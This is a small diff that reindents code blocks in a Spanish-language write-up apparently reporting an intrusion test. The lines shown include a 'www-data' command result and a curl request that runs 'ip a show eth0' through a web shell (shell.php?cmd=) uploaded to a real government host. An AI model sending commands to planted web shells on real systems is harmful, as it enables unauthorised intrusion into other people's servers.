@@ -702,15 +702,15 @@ resultado:
    
    Resultado exitoso:
     
-    ```text
-     www-data
-    ```
+   ```text
+   www-data
+   ```
    
    
    Verificación de conectividad de red:
   
    ```text
-       curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=ip a show eth0"
+   curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=ip a show eth0"
    ```
 
     repuesta: 
